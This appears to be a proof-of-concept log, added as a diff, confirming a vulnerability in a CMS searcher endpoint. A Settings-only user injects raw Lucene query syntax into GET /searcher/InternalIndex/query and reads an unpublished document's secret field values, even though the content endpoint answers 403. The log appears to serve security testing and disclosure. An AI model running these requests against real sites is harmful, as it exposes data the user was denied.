@@ -1,0 +1,19 @@
+==============================================================================
+VULN-007: Lucene NativeQuery injection + cross-index content disclosure via the searcher endpoint
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: GET /searcher/{name}/query (QuerySearcherController.cs:110-113 raw NativeQuery, :135 AllValues; SearcherControllerBase.cs:13 = Settings section floor only)
+[SETUP] admin authenticated to Management API
+[SETUP] created UNPUBLISHED document c1636bf1-03e3-467b-96d6-87ac7be920f5  name='secretdoca6449e'  body(secret)='topsecretvald5bb729847a6'
+[SETUP] content indexed after ~3s (InternalIndex returns the secret value)
+[SETUP] created Settings-ONLY user lowuser_d935fb3e@example.invalid (Settings section; NO Content, NO Media)
+[STEP] low-priv allowedSections=['Umb.Section.Settings']  (content=False, media=False, settings=True)
+[STEP] baseline: GET /document/c1636bf1-03e3-467b-96d6-87ac7be920f5 via the normal content endpoint (needs the Content section)
+[PROOF] GET /document/{secretDoc} -> 403 Forbidden — the user genuinely cannot read content here
+[STEP] attack: GET /searcher/InternalIndex/query?term=nodeName:secretdoca6449e  (as the Settings-only user)
+[PROOF] searcher returned the forbidden document: id=1163, __Key=['c1636bf1-03e3-467b-96d6-87ac7be920f5'], nodeName=['secretdoca6449e']
+[PROOF] AllValues leaked the secret property value  body=['topsecretvald5bb729847a6']  (+ path/creatorName/writerName/etc. — full field dump)
+[PROOF] ExternalIndex total=0 for the same node -> the leaked document is UNPUBLISHED/draft (only the InternalIndex holds it), yet it still leaked
+[PROOF] raw Lucene boolean/fielded query 'nodeName:secretdoca6449e AND __IndexType:content' parsed and matched (total=1) — attacker query syntax reaches NativeQuery unescaped
+[PROOF] malformed leading-wildcard term '*abc' -> HTTP 400 'Could not parse the query' — the raw term is fed to Lucene's classic QueryParser (NativeQuery injection, not escaped)
+==> VULN-007: CONFIRMED — Settings-only user (no Content/Media) read a 403-forbidden document's property values via /searcher and injected raw Lucene syntax
